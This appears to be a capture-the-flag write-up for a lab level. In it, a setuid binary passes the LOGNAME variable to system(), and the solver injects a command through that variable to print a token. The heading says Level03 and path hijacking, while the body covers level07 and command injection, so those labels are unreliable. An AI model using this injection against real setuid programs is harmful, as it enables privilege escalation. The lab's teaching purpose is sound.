# Level03 Documentation

## Objective
Exploit a vulnerable binary to retrieve the token for `level04` by manipulating the `PATH` environment variable.

---

## Approach & Tools
- **Technique**: Path hijacking and environment variable manipulation.
- **Commands**: `ltrace`
- **Tools**: [ghidra](https://ghidra-sre.org/) (optional).

## Step-by-Step Solution
once we log into level07 account we find a binary named ```level07```.
```bash
ls -la /home/user/level07/
```
#### Output:
```bash
-rwsr-sr-x 1 flag07  level07 8627 Mar  5  2016 level07
```

### 1. Analyze the Binary
The `level07` binary prints "level07" and dont take command line arguments nor any does it takes any input. we can use [ltrace](https://www.man7.org/linux/man-pages/man1/ltrace.1.html). to trace system calls in ```level03``.
```bash
ltrace ./level07
```

#### output
```bash
__libc_start_main(0x8048514, 1, 0xbffffd14, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                             = 2007
geteuid()                                                             = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                   = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                   = 0
getenv("LOGNAME")                                                     = "level07"
asprintf(0xbffffc64, 0x8048688, 0xbfffff4f, 0xb7e5ee55, 0xb7fed280)   = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                = 0
+++ exited (status 0) +++
```

To better visualize this code we can use a decompile that can reconstruct this code to more higher level code, such as C / C++. i used ghidra

The decompiled code from Ghidra is as follows :
```c
int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int iVar2;
  char *buffer;
  gid_t gid;
  uid_t uid;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;
  
  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  pcVar1 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
  iVar2 = system(local_1c);
  return iVar2;
}
```
### 4. Exploit via LOGNAME

Inject getflag into the LOGNAME variable:
```bash
export LOGNAME='$(getflag)'
./level07
```
#### Output:
```bash
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

### Key Takeaways

* Environment Variables Are Attack Vectors:Programs using getenv() without validation can be exploited.

* Command Injection: Always sanitize variables before passing them to system().

* No Decompilation Needed:Simple observation of binary behavior "getenv("LOGNAME")" revealed the exploit path.